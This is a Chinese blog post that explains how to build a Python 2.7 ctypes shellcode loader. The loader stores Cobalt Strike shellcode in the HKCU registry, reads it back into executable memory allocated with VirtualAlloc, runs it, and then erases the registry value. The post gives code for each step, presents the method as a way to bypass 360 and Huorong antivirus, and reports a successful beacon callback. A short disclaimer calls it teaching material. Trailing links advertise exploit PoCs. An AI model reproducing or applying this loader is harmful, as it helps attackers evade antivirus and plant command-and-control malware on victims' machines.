> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/lTBgA6sHt-YPL5wYZ62XKQ)

![](https://mmbiz.qpic.cn/mmbiz_jpg/zbTIZGJWWSPQdnFLNBOibeibWcF6a35v8gPjAL4EpmW03fg3nVwwzDGvuUvvX8kstOfKfMzmpPrv8hkuf1bbef5g/640?wx_fmt=jpeg)  

一位苦于信息安全的萌新小白帽

本实验仅用于信息防御教学，切勿用于它用途

公众号：XG 小刚

最近毕业了，开始了新的打工生活，知识也被榨干了，更新比较慢

**前言**  

前几天不是发了几个《[UUID、MAC、ipv4](http://mp.weixin.qq.com/s?__biz=MzIwOTMzMzY0Ng==&mid=2247485833&idx=1&sn=82c2f120b6c5058dc9afcc4eeefb89b5&chksm=97743568a003bc7e9e62e90d2353ecb17c2761a492b494417290b85e7fd39a8da3d9c5d6d249&scene=21#wechat_redirect)》等加载器吗，这几个原理都一个样，就是转换内容然后写到内存中去，说白了只要能往内存写东西的函数都能写成加载器

这几天研究 api 操作注册表想绕过 360 等，突然想起注册表是可以存储二进制内容的，然后就发现了 RegQueryValueExA 函数是可以读取 注册表中内容的，所以我们只要将读取的内容存到申请的内存中去执行即可。

本文环境使用 py2.7，通过 ctypes 库调用 RegQueryValueExA 函数实现上线 cs

**注册表**

注册表就不多介绍了，乱七八糟的我也讲不懂，自己百度  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPQdnFLNBOibeibWcF6a35v8g0effAg74GKHA03ThAl9QWZic3LKEibVMUFWPjHw5p0ddXcAcyYWk3Bhg/640?wx_fmt=png)

但主要一点，我们操作注册表是需要权限的，但 HKLM_CURRWNT_USER 表是不需要权限的，所以我们主要操作这个表  

**函数介绍**

在读取注册表内容之前，注册表得有我们的 shellcode 内容啊，命令行操作 reg 又不行，拦的死死地，所以只能用 api 进行写入我们的 shellcode  

RegSetValueExA

该函数在 Advapi32.dll 库中，可以设置注册表项下指定值的数据和类型。

函数原型：

```
https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa
```

```
LSTATUS RegSetValueExA(
  HKEY       hKey,
  LPCSTR     lpValueName,
  DWORD      Reserved,
  DWORD      dwType,
  const BYTE *lpData,
  DWORD      cbData
);
```

hKey 为上面五个表其中一种，这里操作 HKLM_CURRWNT_USER，在 py 里对应值是 - 2147483647  

lpValueName 是在表里新建一个值

dwType 是值的类型，在注册表里不同的值类型储存不同格式的数据，我们需要储存二进制数据，所以值类型为 REG_BINARY，py 里对应数值为 3

lpData 这是我们需要写入的数据，这里写入 shellcode

cbData 是数据的大小，必须将 shellcode 全部写入

```
buf = b"\xfc\x00..."
ctypes.windll.Advapi32.RegSetValueExA(-2147483647, "test", None, 3, buf,len(buf))
```

此时看看注册表里的内容是不是 shellcode  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPQdnFLNBOibeibWcF6a35v8gs79rtb3luibicK2g7vyOdR2FTQP2SBz9Roicj2Fp6TfhHvESMzDzTDNBw/640?wx_fmt=png)

RegQueryValueExA  

该函数在 Advapi32.dll 库中，检索与打开的注册表项关联的指定值名称的类型和数据。

函数原型：

```
https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryvalueexa
```

```
LSTATUS RegQueryValueExA(
  HKEY    hKey,
  LPCSTR  lpValueName,
  LPDWORD lpReserved,
  LPDWORD lpType,
  LPBYTE  lpData,
  LPDWORD lpcbData
);
```

hKey 对应上面注册表的组  

lpValueName 对应上面值的名称

lpType 接收查到的值的类型，可以为 0 表示不需要此内容

lpData 则接收我们查到的值的数据，也就是我们的 shellcode，这里需要 VirtualAlloc 申请一块内存来接收此数据，这里根据需要的指针类型将内存改为 LPBYTE 的指针

```
LPBYTE = POINTER(c_byte)
ctypes.windll.kernel32.VirtualAlloc.restype = LPBYTE
ptr = ctypes.windll.kernel32.VirtualAlloc(0,800,0x3000,0x40)
```

lpcbData 则是 shellcode 的长度，这里长度我们需要先执行一下 RegQueryValueExA 来获取一下 shellcode 长度，然后继续直接 RegQueryValueExA 来去读内容到申请的内存  

```
data_len = DWORD()
ctypes.windll.Advapi32.RegQueryValueExA(-2147483647, "test", 0, 0, 0, byref(data_len))
ctypes.windll.Advapi32.RegQueryValueExA(-2147483647,"test",0,None,ptr,byref(data_len))
```

这时 shellcode 已经写入到内存中去了，继续老一套创建线程运行即可  

当写完内存，以防万一将写入的注册表进行删除

```
ctypes.windll.Advapi32.RegDeleteValueA(-2147483647, "test")
```

测试

环境 py2.7 , 使用 cs 生成 64 位 shellcode

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPQdnFLNBOibeibWcF6a35v8gC9PuaOyTdNCoVNyVtAfQEs0doicIC30DaYA5v9z3Y8Esn7FDldFh1FA/640?wx_fmt=png)

这里测试了火绒，360，成功上线  

**源码公众号回复：**_**注册表加载器**_ **获取**

****【往期推荐】****  

[【内网渗透】内网信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485796&idx=1&sn=8e78cb0c7779307b1ae4bd1aac47c1f1&chksm=ea37f63edd407f2838e730cd958be213f995b7020ce1c5f96109216d52fa4c86780f3f34c194&scene=21#wechat_redirect)  

[【内网渗透】域内信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485855&idx=1&sn=3730e1a1e851b299537db7f49050d483&chksm=ea37f6c5dd407fd353d848cbc5da09beee11bc41fb3482cc01d22cbc0bec7032a5e493a6bed7&scene=21#wechat_redirect)

[【超详细 | Python】CS 免杀 - Shellcode Loader 原理 (python)](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486582&idx=1&sn=572fbe4a921366c009365c4a37f52836&chksm=ea37f32cdd407a3aea2d4c100fdc0a9941b78b3c5d6f46ba6f71e946f2c82b5118bf1829d2dc&scene=21#wechat_redirect)

[【超详细 | Python】CS 免杀 - 分离 + 混淆免杀思路](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486638&idx=1&sn=99ce07c365acec41b6c8da07692ffca9&chksm=ea37f3f4dd407ae28611d23b31c39ff1c8bc79762bfe2535f12d1b9d7a6991777b178a89b308&scene=21#wechat_redirect)  

[【超详细】CVE-2020-14882 | Weblogic 未授权命令执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485550&idx=1&sn=921b100fd0a7cc183e92a5d3dd07185e&chksm=ea37f734dd407e22cfee57538d53a2d3f2ebb00014c8027d0b7b80591bcf30bc5647bfaf42f8&scene=21#wechat_redirect)

[【超详细 | 附 PoC】CVE-2021-2109 | Weblogic Server 远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486517&idx=1&sn=34d494bd453a9472d2b2ebf42dc7e21b&chksm=ea37f36fdd407a7977b19d7fdd74acd44862517aac91dd51a28b8debe492d54f53b6bee07aa8&scene=21#wechat_redirect)

[【漏洞分析 | 附 EXP】CVE-2021-21985 VMware vCenter Server 远程代码执行漏洞](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247487906&idx=1&sn=e35998115108336f8b7c6679e16d1d0a&chksm=ea37eef8dd4067ee13470391ded0f1c8e269f01bcdee4273e9f57ca8924797447f72eb2656b2&scene=21#wechat_redirect)

[【CNVD-2021-30167 | 附 PoC】用友 NC BeanShell 远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247487897&idx=1&sn=6ab1eb2c83f164ff65084f8ba015ad60&chksm=ea37eec3dd4067d56adcb89a27478f7dbbb83b5077af14e108eca0c82168ae53ce4d1fbffabf&scene=21#wechat_redirect)  

[【奇淫巧技】如何成为一个合格的 “FOFA” 工程师](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485135&idx=1&sn=f872054b31429e244a6e56385698404a&chksm=ea37f995dd40708367700fc53cca4ce8cb490bc1fe23dd1f167d86c0d2014a0c03005af99b89&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[记一次 HW 实战笔记 | 艰难的提权爬坑](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=2&sn=5368b636aed77ce455a1e095c63651e4&chksm=ea37f965dd407073edbf27256c022645fe2c0bf8b57b38a6000e5aeb75733e10815a4028eb03&scene=21#wechat_redirect)

[【超详细】Microsoft Exchange 远程代码执行漏洞复现【CVE-2020-17144】](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485992&idx=1&sn=18741504243d11833aae7791f1acda25&chksm=ea37f572dd407c64894777bdf77e07bdfbb3ada0639ff3a19e9717e70f96b300ab437a8ed254&scene=21#wechat_redirect)

[【超详细】Fastjson1.2.24 反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)

_**走过路过的大佬们留个关注再走呗**_![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEATexewVNVf8bbPg7wC3a3KR1oG1rokLzsfV9vUiaQK2nGDIbALKibe5yauhc4oxnzPXRp9cFsAg4Q/640?wx_fmt=png)

**往期文章有彩蛋哦****![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTHtVfEjbedItbDdJTEQ3F7vY8yuszc8WLjN9RmkgOG0Jp7QAfTxBMWU8Xe4Rlu2M7WjY0xea012OQ/640?wx_fmt=png)**  

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTECbvcv6VpkwD7BV8iaiaWcXbahhsa7k8bo1PKkLXXGlsyC6CbAmE3hhSBW5dG65xYuMmR7PQWoLSFA/640?wx_fmt=png)

一如既往的学习，一如既往的整理，一如即往的分享。![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icl7QVywL8iaGT0QBGpOwgD1IwN0z9JicTRvzvnsJicNRr2gRvJib6jKojzC5CJJsFPkEbZQJ999HrH5Gw/640?wx_fmt=png)  

“**如侵权请私聊公众号删文**”

公众号